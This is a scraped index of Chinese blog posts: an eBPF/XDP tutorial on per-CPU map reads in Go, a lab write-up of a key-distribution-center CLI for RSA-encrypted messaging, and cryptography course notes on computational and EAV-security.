权限下查看 /sys/devices/system/cpu/possible 文件来获取内核认为可能会存在的 CPU 数目，从而当我们读取 per-cpu buffer 时，需要读取这些所有可能存在 CPU 的 buffer。有关 num_possible_cpus 的讨论可以参考此处。 eBPF 程序编写指南 在编写 BPF 程序时，遇到不熟悉的函数或者用法，可以查看 bpf-helpers。通过 man bpf-helpers 命令可以查看各函数相关入参、使用方法描述以及函数的返回值。 我在本课程中使用 Go 语言编写对应的用户态代码，主要使用到了 github.com/aquasecurity/libbpfgo 这个库，其中遇到了一些坑（也许是我不会用 😅） 我们可以通过 bpfModule.GetMap(\"xdp_stats_map_percpu\") 获取 BPF Maps 对象，此后便可以将其卸载到指定的 NIC 上，监听该网卡上接收到的数据包。接着使用 bpfMap.GetValu e(unsafe.Pointer(\u0026XDP_PASS)) 我们便可以获取 Map 对应 Key 所存储的数据。但我尝试从 BPF_MAP_TYPE_PERCPU_ARRAY 类型的 Map 中获取数据时却没有得到预期中的结果。我随即查阅了 (*BPFMap) GetValue(unsafe.Pointer) 函数的相关实现， // GetValue takes a pointer to the key which is stored in the map. // It returns the associated value as a slice of bytes. // All basic types, and structs are supported as keys. // // NOTE: Slices and arrays are also supported but special care // should be taken as to take a reference to the first element // in the slice or array instead of the slice/array itself, as to // avoid undefined behavior. func (b *BPFMap) GetValue(key unsafe.Pointer) ([]byte, error) { value := make([]byte, b.ValueSize()) valuePtr := unsafe.Pointer(\u0026value[0]) ret, errC := C.bpf_map_lookup_elem(b.fd, key, valuePtr) if ret != 0 { return nil, fmt.Errorf(\"failed to lookup value %v in map %s: %w\", key, b.name, errC) } return value, nil } 可以看到其中 value 分配的内存空间只有 b.ValueSize() 也即单个 Value 数据结构的空间，但当我们使用 BPF_MAP_TYPE_PERCPU_ARRAY Map 类型时，bpf_map_lookup_elem 返回的是所有 CPU 各自持有的 Map 对象中的数据， struct datarec values[nr_cpus]; // sizeof(struct datarec) * nr_cpus int i; if ((bpf_map_lookup_elem(fd, \u0026key, values)) != 0) { fprintf(stderr, \"ERR: bpf_map_lookup_elem failed key:0x%X\\n\", key); return; } for (i = 0; i \u003c nr_cpus; i++) { sum_pkts += values[i].rx_packets; sum_bytes += values[i].rx_bytes; } bpf_map_* 系列函数都是通过 bpf() 系统调用实现的，具体实现参考此处，也可以参考 bpf 系统调用手册。 示例代码运行输出 \r秉着有问题就要暴露出来的想法，我去 lib","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:5","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"TCP 协议报文结构 RFC 793 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Source Port | Destination Port | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Sequence Number | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Acknowledgment Number | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Data | |U|A|P|R|S|F| | | Offset| Reserved |R|C|S|S|Y|I| Window | | | |G|K|H|T|N|N| | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Checksum | Urgent Pointer | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Options | Padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | data | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ TCP Header Format 相关字段含义网络上已经有非常多详细的说明，在本文中便不再赘述。 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:6","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"IP 协议报文结构 RFC 791 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |Version| IHL |Type of Service| Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Identification |Flags| Fragment Offset | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Time to Live | Protocol | Header Checksum | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Source Address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Destination Address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Options | Padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Example Internet Datagram Header 相关字段含义网络上已经有非常多详细的说明，在本文中便不再赘述。 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:7","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"References Github repo for Learning XDP Programming Cilium BPF reference guide for building industrial application with BPF General Introduction to XDP in the academic paper or the presentation. Linux 内核观测技术 BPF 极客时间课程，倪鹏飞老师的 eBPF 核心技术与实战 Cilium: eBPF-based Networking, Security, and Observability tracee: Linux Runtime Security and Forensics using eBPF ebpf official ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:8","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"Architecture Design 模拟实现128位信息的加密通信过程。 实验设计包含三方：A，B，C。A与B之间进行128位信息的加密交换。C负责为A和B各生成一对公私钥对，并分别把对应的私钥传给A和B，并把他们的公钥公开。实现本实验需求的架构设计如下图所示， 项目数据流图\" 项目数据流图 ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:1:0","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"Protocol Design 在该实验需求中，ServerA与ServerB之间使用Asymmetric Encryption Scheme进行加密通信，ServerC充当密钥签发中心，负责为ServerA与ServerB生成公私钥对，并将私钥分发给对应的Client。ServerA与ServerB的地位是等价的，都是希望进行加密通信的对等主体，也都是向KDC申请密钥的主体，在下述分析过程中不再区分ServerA与ServerB，我们统称为通信方。 ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:2:0","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"ServerC——Key Distribution Center ServerC中KDC的常驻守护进程监听来自443端口的请求，负责为到访的Client签发公私钥对，并为其提供其所想要进行加密通信方的网络地址以及该主体对应的公钥。 集群中所有主体在进行加密通信之前都需要先在KDC中进行注册。KDC会为发起请求的Client签发一对公私钥并记录下该Client信息接收端的网络地址信息与其对应的公钥信息。 该注册过程我们假设是在高权限安全环境下进行的，也就是意味着能够进行注册的用户都是合法的。 KDC与Client之间通信基于TLS（或使用协议一中的认证密钥交换方案建立会话密钥），因此KDC向Client发送的私钥敏感信息是受到保护的。 KDC假设所有的Client都能够保存好自己被分配的私钥，若私钥遗失则无法从Client端发起重置密钥的请求（无法验证Client身份），此时必须联系KDC管理员申请重置密钥。 拥有合法私钥的Client可以向KDC发起重置密钥请求，但是这并不被推荐。因为其它的Client在本地缓存了对等方的公钥，这个公钥在这时已经失效了。此时它需要重新访问KDC获取其最新的公钥，以实现与该Client的加密通信。 KDC使用自签名证书来证书自己的合法身份，在本次实验中为了方便起见就不将该自签名证书添加至系统证书根信任链中，我们通过在客户端中设置InsecureSkipVerify: true 来免除系统对证书的校验。 KDC与Client间通信的报文格式 Client 请求报文 (向KDC注册自身) [0x00-0x01] Action (0x01) 向KDC表示这是一个请求注册报文 [0x01-0x0b] ClientName_Hasing_Hex_Truncated_10 [0x0b-0x1f] padding_receiverAddr [0x1f-0x24] padding_receiverPort [0x24-0x25] EOF Bytes (0x00) KDC响应报文 [0x00-0x80] PrivateKey Client请求报文 [0x00-0x01] Action (0x02) 向KDC表示这是一个请求获取通信方公钥与网络地址信息的报文 [0x01-0x0b] ClientName_Hasing_Hex_Truncated_10 [0x01-0x15] RemoteServer_Hasing_Hex_Truncated_10 [0x15-0x35] Signature of ClientName_Hasing _Hex_Truncated_10 KDC响应报文 [0x00-0x01] ValidMark (0x01表示请求Client与其想要进行通信的对象已经在KDC注册并且签名通过验证) [0x01-0x15] TargetServer.receiverAddr **Padding** [0x15-0x1a] targetServer.receiverPort **Padding** [0x1a-0x9a] TargetServer.receiverPublicKey ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:2:1","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"Communication Peers 在本实验需求中，ServerA与ServerB都是希望进行加密通信的主体，它们向KDC注册自身并通过KDC发现其它同僚。现以ServerA想要向ServerB发起一次加密通信的过程为例，讲解本实验设计。 ServerA若想要与ServerB进行通信，就必须在KDC中注册自身，同理，ServerB也需要在KDC中注册自身，这样ServerA与ServerB就加入了这个集群之中。 ServerA通过TLS加密保护的信道接收由KDC生成的私钥并将其保存至本地。 ServerA事先知道ServerB在这个集群中的唯一标识符（Identification）。通过这个标识符，ServerA能够向KDC发起一次询问，请求ServerB所在的网络地址、ServerB信息接收端所监听的端口以及ServerB的公钥等相关信息。于此同时，ServerA向KDC发送的报文中携带了ServerA对其Identification的签名用以证明它是该集群中的合法成员。 ServerA若能够通过KDC的验证则会收到来自KDC的响应。该响应报文中包含了ServerB的网络地址以及其公钥等信息。 ServerA利用ServerB的网络地址向其发起一次TCP连接，可以注意到该TCP连接并没有使用TLS进行保护，所有在这个连接中传输的数据都是未经加密的。 ServerA使用ServerB的公钥对其要发送给ServerB的数据进行加密，并将加密后的数据推入TCP建立的信道之中。 ServerB监听到来自ServerA的连接请求，与ServerA建立起TCP连接，并接收由ServerA中传输过来的加密数据 ServerB使用自己的私钥对来自ServerA的加密数据进行解密，并将解密后的明文写入文件和标准输出流中（写入文件中的数据以16进制的形式表示，至于输出流中的数据是转换为ASCII字符后进行展示，我们这里假设传输的数据都是可打印字符） 这样ServerA与ServerB之间一次加密通信过程就完成了。 ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:2:2","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"Implementation 本实验基于Golang Cobra框架实现了一个CLI应用，具体的代码可参考仓库。这里仅给出使用本CLI应用进行ServerA与ServerB加密通信，以及KDC密钥签发的过程。 首先我们需要启动KDC的守护进程，该进程在443端口监听来自Client的请求，为客户端提供密钥签发注册以及远程服务器发现的服务。 使用命令：sudo ./kdc 启动KDC服务，监听443端口。 启动 KDC 服务\" 启动 KDC 服务 使用命令：./apollo regist -k localhost -l 443 -t localhost -p 7070 -n serverA -f privateK_A.key 向KDC发起注册请求，其中-k 表示KDC的Hostname ；-l 表示KDC服务的监听端口；-t 表示ServerA Receiver的Hostname ；-p 表示ServerA Receiver服务的监听端口；-n 表述ServerA在集群中的标识符；-f 表述存储KDC签发私钥的文件路径。 向KDC发起注册请求\" 向KDC发起注册请求 同理，使用命令：./apollo regist -k localhost -l 443 -t localhost -p 7071 -n serverB -f privateK_B.key 向KDC注册ServerB。 我们可以在KDC输出的日志中看到相关的注册信息， 在KDC输出的日志中查看相关的注册信息\" 在KDC输出的日志中查看相关的注册信息 紧接着我们令ServerA向KDC获取ServerB的网络地址信息以及公钥，使用命令：./apollo getremote --cn serverA -r serverB -f remote_B -p ./privateK_A.key 。其中，--cn 表示当前Client在集群中的标识符，-r 标识ServerA想要请求的ServerB在集群中的标识符，-f 表示若KDC成功验证ServerA的合法性返回的ServerB网络地址以及公钥信息保存的文件路径，-p 表示ServerA对应的私钥文件，该文件用于对于唯一标识进行签名，表明ServerA的合法性。该命令的执行结果如下， ServerA向KDC获取ServerB的网络地址信息以及公钥\" ServerA向KDC获取ServerB的网络地址信息以及公钥 利用上述过程获取到的信息，ServerA与ServerB已经能够进行通信了，首先我们创建一个文件helloB 并在其中写入如下内容， 向待发送文件写入内容\" 向待发送文件写入内容 使用命令：./apollo setupreceiver --privk-file=privateK_B.key --listen-port=7071 开启ServerB Receiver服务，如下所示， 开启ServerB Receiver服务\" 开启ServerB Receiver服务 使用命令：./apollo send --remote-info=./remote_B --sending-file=./helloB 向ServerB Receiver发送加密数据，如下所示， 向ServerB Receiver发送加密数据\" 向ServerB Receiver发送加密数据 在 ServerB Receiver 端我们可以看见解密后的内容如下所示， 在 ServerB Receiver 端 查看解密后的内容\" 在 ServerB Receiver 端 查看解密后的内容 至此我们便完成了ServerA与ServerB依靠KDC的密钥分发与服务发现实现利用Asymmetric Encryption Scheme进行加密通信的需求。 ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:3:0","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"Helpful Commands Openssl Usage # TLS Client tools openssl s_client -connect localhost:443 # generate a private key with the correct length openssl genrsa -out server.key 2048 # optional: create a self-signed certificate openssl req -new -x509 -key server.key -out server.pem -days 3650 RegistA ./apollo regist -k localhost -l 443 -t localhost -p 7070 -n serverA -f privateK_A.key RegistB ./apollo regist -k localhost -l 443 -t localhost -p 7071 -n serverB -f privateK_B.key GetRemoteInfo ./apollo getremote --cn serverA -r serverB -f remote_B -p ./privateK_A.key Send ./apollo send --remote-info=./remote_B --sending-file=./helloB Setupreceiver ./apollo setupreceiver --privk-file=privateK_B.key --listen-port=7071 ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:4:0","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"Chatting 这个实验的设置确实有点一头雾水。你既然选择实现一个KDC（Key Distribution Center）作为一个密钥签发与管理中心，那么就意味着这是一个中心化的密钥管理存储解决方案，那为什么还要选择Asymmetric Encryption Scheme去做呢？作为KDC应该去实现Symmetric Encryption Scheme为End-to-End提供会话密钥与存储服务，当用户A需要与用户B进行加密通信时，KDC应该为这两个用户生成这样一个密钥并为他们维护这样一个密钥。当然这里简化了KDC与用户进行交互授权认证的过程，具体的可以参考kerberos协议。 再者使用Asymmetric Encryption Scheme去加密数据效率是不高的，并且对于数据量较大的场景来说原生的加密方案将无法使用（比如RSA方案中，所加密的数据必须能够映射到所使用的群中的一个元素）Asymmetric Encryption Scheme最典型的应用场景是数字签名和密钥交换。比如我们可以在本实验的场景之下，将ServerC直接移除，仅依靠ServerA与ServerB就可以实现加密通信。ServerA与ServerB可以使用DHKE方案去为通信双方在公开信道下生成一个“秘密”，将该“秘密”经过sha256散列之后作为AES_GCM的密钥，使用Symmetric Encryption Scheme去实现双方的加密通信。这便是TLS/SSL的高度简化版本，有关TLS/SSL的规范可以点击这里。 A typical operation with a KDC involves a request from a user to use some service. The KDC will use cryptographic techniques to authenticate requesting users as themselves. It will also check whether an individual user has the right to access the service requested. If the authenticated user meets all prescribed conditions, the KDC can issue a ticket permitting access. KDCs mostly operate with symmetric encryption. – From WiKi 吐槽归吐槽，本实验刚好让我实践一下刚刚接触的Cobra框架，虽然用到的东西不多，使用方法也不够优雅，可能还有些凌乱，但能进行一次实践终归是有裨益的。害，不知什么时候能够将6.824的Raft K/V写完呢？ ","date":"2022-03-16","objectID":"/2022-03-16-infosec-2/:5:0","tags":["project"],"title":"InfoSec-Lab2-apollo","uri":"/2022-03-16-infosec-2/"},{"categories":null,"content":"Private-Key (Symmetric) Cryptography 章节思维导图\" 章节思维导图 在本章节中，我们开始介绍两大密码学方向中的私钥/对称密码学（Private-Key/Symmetric Cryptography）方向。 （1）我们将会从弱化完善保密理论安全性开始，得到一个在实践生产中能够被接受并且符合实际人们对安全性需求的安全定义（computational secrecy）。 （2）接着我们从 computational secrecy 出发，给出一种最为基本的安全性定义—— EAV-Security（窃听者安全），并且对 Semantic Security 作出讨论。 （3）为了构造一个 EAV-Security Encryption Scheme 我们需要了解密码学中一个常用的组件—— Pseudorandom Generators，并且学习如何通过 Reductions 对一个 Encryption Scheme 的安全性作出证明。在上述铺垫过后，我们就可以构造一个 EAV-Security Encryption Scheme 并且使用 Reductions 去证明该方案的安全性。 （4）在实践应用中，密码方案仅达到 EAV-Security 是远远不足够的，这时候我们就需要一些安全性更强的定义（弱化对攻击者能力作出的限定而密码方案不被攻破），CPA-Security 与 CCA-Security 便是两种在安全性定义上更为严苛（攻击者的能力更加强大）的定义。 （5）有了上述定义过后，我们需要能够构造满足上述定义的加密方案。在构造具体的方案以前，我们需要介绍 Pseudorandom Functions and Permutations 两类定义，它们将在构造的具体方案中扮演重要的角色。 （6）最后，我们将会介绍在实践中使用的对称密码的两种形式—— Stream Cipher 和 Block Cipher，并介绍它们相应的操作模式。 ","date":"2021-12-02","objectID":"/2021-12-05-chapter3/:1:0","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Private-Key Cryptography Ⅰ","uri":"/2021-12-05-chapter3/"},{"categories":null,"content":"Computational Security 完善保密理论为我们提供了信息论级别的安全强度，满足该理论定义的方案提供的安全性甚至不需要对攻击者的计算能力进行约束，是最为理想的情况（攻击者在观察到密文的情况下没有办法得到关于明文的任何一点信息），这也是我们加密的目的——为了保护明文中的信息。但完善保密理论的缺点也十分明显（我们在上一章节中有所讨论），而这些缺点在实际应用上是不可以接受的，我们需要对安全性作出妥协从而使得方案可落地执行并大面积推广使用。事实证明对完善保密理论进行弱化能够达到在保证足够安全性的同时在实践上也具有可操作性。我们只要假设 efficient attacker 在一个可被接受的时间跨度内密码方案被攻破的概率为一个可忽略的量即可，有关 「efficient」等概念我们将在后续的讨论中看到。 我们来看一个教材上有关于 Computational Security Encryption Scheme 的实例描述 一个加密方案需要窃听者在计算速度最快的计算机上投入至少200年的时间才能够以 $2^{-60}$ 这么小的概率能够获得密文泄露的明文信息，这时我们可以认为该加密方案是符合 Computational Secuirty 的。 通过对 Perfect Secrecy 安全性的弱化，我们得到了一个在实践上更具有意义的安全性表述。我们可以看到与 Computational Security 与 Perfect Secrecy 在下列定义中的区别， Security is only guaranteed against efficient adversaries that run for some feasible amount of time. 在这里我们能够发现，我们对攻击者的能力作出了限制，攻击者能够访问的计算资源有限并且其需要在规定的时间范围内攻破密码方案。如果我们的攻击者具有无约束的时间或计算能力，在此安全性定义下，它是能够攻破我们的密码方案的。不过在现实密码方案的构造中，我们可以通过精心设计密码方案使得任何一个现实意义上的攻击者都无法获得充足的资源（时间/计算）令其能够攻破该方案，这时候我们也可以认为该方案是牢不可破的。 Adversaries can potentially succeed with some very small probability. 在该定义下，攻击者是有概率攻破满足 Computational Security 的方案的。不过我们能够使得该概率足够的小（就像我们上一个例子中的，小于 $2^{-60}$），这样我们也无需为一个小概率事件而担忧。（通常小概率事件的发生意味着系统本身的出现了设计者意料之外的事件，这些未被考虑的事件极大的影响了概率分布） 为了给 Computational Security 一个精确的定义，我们将会从以下两种路线来去描述 Computational Security. The Concrete Approach A scheme is $(t,\\epsilon)-secure$ if any adversary running for time at most $t$ succeeds in breaking the scheme with probability at most $\\epsilon$. 在 Concrete Approach 中，我们通过明确界定潜在攻击者成功攻破该密码方案的最大概率以及其在上面所投入的资源（时间/算力）总量去量化一个加密方案的安全性。在该定义中，攻击者能够使用的算力资源以及其能够花费的时间资源已经被限定，并且在上述限定之下攻击者的成功概率也仅为一个十分小概率 $\\epsilon$，这样我们便给出了在 Concrete Approach 中 Computational Security 的定义。这种定义 Computation Security 的方法在实践中十分重要，因为它回答了使用密码方案的用户最为关心的问题（这个密码方案所承诺的安全性能够达到我的安全性需求吗？），并且给出了精确的表述。不过在有些情况下给出精确的量化表述是困难的，这时候我们就需要使用到另外一种 Computational Security 的定义方法。 The Asymptotic Approach A scheme is computationally secure if any PPT(probabilistic polynomial-time) adversary succeeds in breaking the scheme with at most negligible(smaller than any inverse polynomial in n) probability. 由上述定义可以发现，这种渐进表述减少了对精确定量描述的使用。比如，在对攻击者能力进行限定时，该定义将攻击者能力抽象表述为具有概率多项式时间（PPT 攻击者在多项式时间内运行其攻击算法，其最多为 $p(n)$，取决于具体安全参数的大小）的攻击者，而不同于在 Concrete Approach 中 $(t,\\epsilon)-secure$ 精确定义了攻击者能够使用的算力/时间资源。类似的，在表述攻击者在限制下成功攻破方案的概率时也使用了类似的抽象描述（negligible probability）而不是一个确切的概率值。这种不使用确切的量对 Computational Security 进行定义简化了抽象表述一个密码方案时步骤（我们在实践应用中仍然需要考虑 Concrete Approach），不过这也带来了一些需要解决的问题，我们需要准确地定义这些提到的抽象概念，使得在这种表述下的定义满足 Computational Security. 这种 Asymptotic Approach 根植于计算复杂度理论（回忆一下大 $O$ 记号），并且引入了安全参数 $n$ 用以观察在 $n$ 不断增长的情况下，参与到密码方案的主体（受信主体与攻击者）在计算上所花费时间的增长趋势。我们也可以认为这引入的安全参数 $n$ 与密钥的长度呈正相关、看作与攻击者攻击密码方案成功所需的运行时长相关、与攻击者成功攻击密码方案的概率相关等……事实上我们可以看到，随着安全参数 $n$ 的增加，密码方案是更加“安全的”（这种安全并不是由替换具体的密码方案带来的，而是通过增加密钥空间的大小来去降低攻击者进行 Brute-force Attack 成功的概率）。我们也会看到任意选取安全参数 $n$ 可能会给密码方案带来不一样的安全性，较小的 $n$ 可能毫无安全性可言，随着 $n$ 的增加不同的加密方案接近我们理想的安全需求的速率也不一样，这也是该方法称为 Asymptotic 的一个理由之一。值得注意的是，一个密码方案在实践中可用意味着合法可信的主体在使用该密码方案进行加密时其也运行着一个多项式时间的算法，并且该算法的时间复杂度要明确小于攻击者在缺少密钥信息的情况下所使用的攻击算法。这样以后即使在算力不断提升的情况下，我们仅需选用更大的安全参数 $n$ 来保障密码方案的安全性而不需要替换掉原有的密码方案，并且这对攻击者而言更加不利（在计算上的投入会比原先的更加大哪怕算力已经得到增长，这是由于其攻击算法的计算复杂度高于合法可信主体所带来的）。具体的例子可以参考教材（PG.46） 下面我们更进一步的讨论何为 negligible probability “可忽略的量\"准确定义\" “可忽略的量\"准确定义 上述定义换一个表述有，对于所有的常数 $c$ ，存在一个整数 $N$ 使得对于所有的 $n\u003eN$ 都有该式成立 $f(n)\u003cn^{-c}$，熟悉高等数学的同学可以想象一下在高数中对于极限的定义。 不严谨的来说 $n^{c}$ 遍历所有的 $c$ 即得到了上述定义中所提到的 every positive polynomial p，并且注意到上述定义是对所有满足 $n\u003eN$ 的整数，都有 $f(n)\u003c\\frac{1}{p(n)}$，替换一下就可以得到 $f(n)\u003cn^{-c}$ . 具体例子可以在教材（PG.48）中得到。 negligible function 有一些很好的性质，下面我们就来看看它的这些性质以及这些性质的具体运用，! “可忽略的量\"的运算特性\" “可忽略的量\"的运算特性 特别的关于推论（2）其暗含了下列事实，如果在一个实验中，某一确定的事件以一个可忽略的概率发生，那么这个实验任意重复多项式时间次，该事件发生的概率仍为一个可忽略的量。 举一个例子，我们来考虑投掷一个公平的硬币（每次实验基本事件发生的概率都相等，为 $\\frac{1}{2}$ ）这个实验，假设我们投掷这个硬币 $n$ 次，并且每一次投掷的结果都为正面朝上，那么该事件发生的概率为 $2^{-n}$ 是一个可忽略的量，这意味着当我们重复这个实验任意多项式时间次，在这些实验中出现 $n$ 枚硬币同时正面朝上的概率仍然是一个可忽略的量。 总结一下，使用 Asymptotic Approach 对密码方案安全性进行定义规避了在 Concrete Approach 中面临的困难，使得我们能够将具体的密码方案安全性抽象出来用以进行理论分析，现在我们可以提供一个完整的定义， 使用渐近的方法定义密码方案的计算安全性\" 使用渐近的方法定义密码方案的计算安全性 可以看到我们对攻击者的能力（算力/时间资源）进行了约束，并且通过引入安全参数 $n$ 我们可以控制密码方案的安","date":"2021-12-02","objectID":"/2021-12-05-chapter3/:1:1","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Private-Key Cryptography Ⅰ","uri":"/2021-12-05-chapter3/"},{"categories":null,"content":"Defining Computationally Secure Encryption 经过上述铺垫，我们可以给出一个符合计算安全性的非对称加密方案的定义了，这个定义类似于我们在 Perfect Secrecy 中提到的，不过有一点稍微不同的是我们在这引入了安全参数 $n$ 用以参数化我们的密码方案，使其能够运用渐进的方式分析其安全性，在教材中我们可以得到如下定义： 通用地定义对称加密方案\" 通用地定义对称加密方案 It is required that for every $n$ , every key $k$ output by $Gen(1^n)$ , and every $m\\in {0,1}^*$ , it holds that $Dec_k(Enc_k(m))=m$. If $(Gen,Enc,Dec)$ is such that for $k$ output by $Gen(1^n)$ , algorithm $Enc_k$ is only defined for message $m\\in {0,1}^{l(n)}$ , then we say that $(Gen,Enc,Dec)$ is a fixed-length private-key encryption scheme for message of length $l(n)$ . 我愿意将 $Dec_k(Enc_k(m))=m$ 这个条件称为加密语义合理性条件，毕竟对于相同的 $k$ 解密后得到的东西不是原来进行加密的东西，那么也就破坏了加密这个词所包含的语义，在固有印象中加密应该是可逆的过程。在给定了 $k$ 之后 $Enc_k$ 也就变成了一元函数，$m$ 作为其定义域也是自然而然。我们可以看到这里 $m$ 使用比特串进行表示的，并且比特长度（一个关于安全参数 $n$ 的函数）被固定了，我们后续会讨论能够加密任意长消息的加密方案定义。 The Basic Definition of Security (EAV-Security) 在本章节中，我们将讨论最基本的安全定义—— EAV-Security，也叫做窃听者安全，指的是攻击者能够窃听通信双方所使用的信道，能够且仅能够获取一条由特定密钥加密的密文消息，这个时候攻击者无法从该密文中恢复部分明文信息，这时我们就可以说通信双方所使用的加密方案满足 EAV-Security。 正如我们在上一章中所讨论到的一样，任何一个安全定义都由两部分组成：（1）威胁模型（该威胁模型定义了攻击者的能力）（2）安全目标（加密方案所承诺提供的安全能力，这通常表现为该方案在何种情况下可以被认定为“被攻破”）。在 EAV-Security 中我们的威胁模型正是 EAV 假设，我们限定了攻击者的能力（攻击者仅能够从合法主体的通信信道中获取之多一条密文信息并且在 PPT 内运行其攻击算法），与在 Perfect Secrecy Encryption Scheme 中的定义不同，这里的攻击者被限制在 PPT 内运行其攻击算法。通过上述假设，我们涵盖了所有运行在计算能力约束下的 PPT 攻击者，并且不需要考虑它们具体的攻击策略，这意味着我们的加密方案的安全性定义对所有符合算力限制的攻击者都有效，这便是一个有效的威胁模型定义。 而关于安全性目标的具体定义就没有威胁模型的定义那么直观，不过，我们仍能够从其背后的思想获得直观的理解，即攻击者不能够从密文中获取关于明文的部分信息。Semantic Security 给出了该直白表述的公式化表达，不过它较为复杂并且难于理解，不过我们回想起在 Perfect Secercy Encryption Scheme 中提到的 indistinguishability ，我们还是有简单的办法表述该定义。 在后面的学习中我们可以发现 Semantic Security 与 Indistinguishability 其实是等价的。 在给出使用实验交互的方式给出攻击者不可区分的定义前，我们先来看看这里的不可区分性与在 Perfect Secrecy 中学习到的有什么不同。 在 Perfect Secrecy 中我们没有对攻击者的能力进行限制，攻击者可以使用无限的计算资源并且允许其运行任意长的时间。而在 EAV-Security 的定义中，攻击者被限制为 PPT 的攻击者，这意味着其运行算法的时间是有限的，并且其所拥有的算力资源也被限制在当代能提供的最大算力资源。 在 Perfect Secrecy 中我们在定义不可区分性时要求攻击者进行不可区分性实验时成功的概率精确的等于 $\\frac{1}{2}$ ，而在 EAV-Security 中我们运行攻击者实验成功的概率可以大于 $\\frac{1}{2}+negl(n)$ 。 我们使用不可区分性实验定义 EAV- Security 时引入了安全参数 $n$，这使得我们能够通过“伸缩”安全参数 $n$ 来改变加密方案提供的安全性，这使得我们能够观察每一个 PPT 的攻击者在何种安全参数下其攻破加密方案的概率达到我们的安全性目标。 在 EAV-Security 中我们要求敌手 $A$ 输出的明文消息 $m_0,m_1$ 具有相同的长度 $l(n)$ 。我们在 Perfect Secrecy 的不可区分性实验中的定义暗含了明文空间包含了一些固定长度的消息，这意味着我们默认一个安全的加密方案不需要去隐藏明文的长度。 下面我们给出对于一个 private-key encryption scheme $\\Pi = (Gen,Enc,Dec)$ ，一个具备 EAV 能力的敌手 $A$ ，和一个安全参数 $n$ 的敌手不可区分性实验 $PrivK^{eav}_{A,\\Pi}(n)$ 的定义， 定义敌手不可区分性实验\" 定义敌手不可区分性实验 该实验进行交互的框图如下所示， 交互实验框图\" 交互实验框图 下面我们给出满足 EAV-Security 的加密方案其 adversarial indistinguishability experiment 应该满足下式， 充要条件\" 充要条件 我们还有一种与上述定义等价的定义形式，如下所示， 等价定义形式\" 等价定义形式 上述定义从攻击者的视角出发，对于每一个 PPT 攻击者，不管它们看到的挑战密文是由 $m_1$ 还是由 $m_2$ 加密而来，它们最终决定输出的 $b'$ 都具有相同行为表现。换句话说，当攻击者接收到挑战密文时它们选择输出 $0$ 还是选择输出 $1$ 